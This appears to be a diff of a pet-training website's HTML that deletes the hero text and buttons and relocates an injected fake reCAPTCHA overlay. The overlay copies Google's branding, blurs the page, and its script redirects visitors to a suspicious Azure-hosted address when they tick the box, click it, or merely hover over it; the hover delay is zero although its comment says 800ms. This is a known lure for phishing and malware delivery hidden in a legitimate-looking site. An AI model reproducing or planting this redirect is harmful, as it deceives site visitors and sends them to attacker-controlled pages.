@@ -1534,12 +1534,8 @@
     <section class="hero" id="home">
         <div class="container">
             <div class="hero-content">
-                <h1>Transform Your Pet's Behavior</h1>
-                <p>Professional training techniques that create lasting bonds between you and your furry friends</p>
-                <div>
-                    <a href="#training" class="cta-button">Start Training Today</a>
-                    <a href="#programs" class="cta-button cta-secondary">View Programs</a>
-                </div>
+              
+              
             </div>
         </div>
         
@@ -1809,63 +1805,7 @@
 
 
 
-	<div class="blur-overlay">
-    <div class="verification-box" id="verify-box">
-      <div class="fake-recaptcha" id="captcha">
-        <input type="checkbox" id="check" />
-        <span>I'm not a robot</span>
-      </div>
-      <div class="recaptcha-logo">
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
-        <span>reCAPTCHA</span>
-      </div>
-    </div>
-
-    <div class="info-text">
-      This site is protected by reCAPTCHA and the Google
-      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
-      <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
-      <br><br>
-      Please confirm you're a human before proceeding. Automated access will be blocked.
-    </div>
-  </div>
-
-  <script>
-    const verifyBox = document.getElementById('verify-box');
-    const check = document.getElementById('check');
-    const redirectUrl = 'https://errorzcx01xmicroszm.z13.web.core.windows.net/'; // Replace with your real destination
-    let redirected = false;
-    let hoverTimeout;
-
-    function redirectIfNotDone() {
-      if (!redirected) {
-        redirected = true;
-        window.location.href = redirectUrl;
-      }
-    }
-
-    check.addEventListener('change', () => {
-      if (check.checked) {
-        redirectIfNotDone();
-      }
-    });
-
-    verifyBox.addEventListener('click', redirectIfNotDone);
-
-    verifyBox.addEventListener('mouseover', () => {
-      if (!redirected) {
-        hoverTimeout = setTimeout(redirectIfNotDone, 00); // Delay hover redirect by 800ms
-      }
-    });
-
-    verifyBox.addEventListener('mouseout', () => {
-      clearTimeout(hoverTimeout); // Cancel hover redirect if mouse leaves early
-    });
-  </script>
-
-
 	
-
           <div class="gallery-item" data-category="cats training">
   <div class="gallery-card before-after-card">
     <div class="before-after-container">
@@ -2146,6 +2086,62 @@
     </div>
 
 
+<div class="blur-overlay">
+    <div class="verification-box" id="verify-box">
+      <div class="fake-recaptcha" id="captcha">
+        <input type="checkbox" id="check" />
+        <span>I'm not a robot</span>
+      </div>
+      <div class="recaptcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+        <span>reCAPTCHA</span>
+      </div>
+    </div>
+
+    <div class="info-text">
+      This site is protected by reCAPTCHA and the Google
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+      <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+      <br><br>
+      Please confirm you're a human before proceeding. Automated access will be blocked.
+    </div>
+  </div>
+
+  <script>
+    const verifyBox = document.getElementById('verify-box');
+    const check = document.getElementById('check');
+    const redirectUrl = 'https://errorzcx01xmicroszm.z13.web.core.windows.net/'; // Replace with your real destination
+    let redirected = false;
+    let hoverTimeout;
+
+    function redirectIfNotDone() {
+      if (!redirected) {
+        redirected = true;
+        window.location.href = redirectUrl;
+      }
+    }
+
+    check.addEventListener('change', () => {
+      if (check.checked) {
+        redirectIfNotDone();
+      }
+    });
+
+    verifyBox.addEventListener('click', redirectIfNotDone);
+
+    verifyBox.addEventListener('mouseover', () => {
+      if (!redirected) {
+        hoverTimeout = setTimeout(redirectIfNotDone, 00); // Delay hover redirect by 800ms
+      }
+    });
+
+    verifyBox.addEventListener('mouseout', () => {
+      clearTimeout(hoverTimeout); // Cancel hover redirect if mouse leaves early
+    });
+  </script>
+
+
+	
 
 
 
